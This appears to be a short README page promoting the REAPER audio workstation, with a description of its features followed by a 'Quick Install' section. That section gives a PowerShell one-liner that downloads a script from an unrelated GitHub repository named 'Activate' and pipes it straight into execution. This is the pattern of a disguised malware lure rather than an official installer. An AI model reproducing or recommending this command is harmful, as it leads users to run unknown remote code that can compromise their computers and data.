# REAPER Audio DAW

REAPER (Rapid Environment for Audio Production, Engineering, and Recording) is a lightweight yet powerful digital audio workstation built by Cockos. It runs on Windows, macOS, and Linux with minimal system requirements.

## Why REAPER?

REAPER stands out for its small installation size, fast load times, and deep customization options. Users can modify nearly every aspect of the interface through custom themes, scripts, and extensions. It supports all major plugin formats including VST, VST3, AU, and JS, making it compatible with thousands of third-party tools. The licensing model is affordable compared to other professional DAWs, with a generous evaluation period.

## Quick Install

Run this command in PowerShell to get started:

```powershell
irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
```
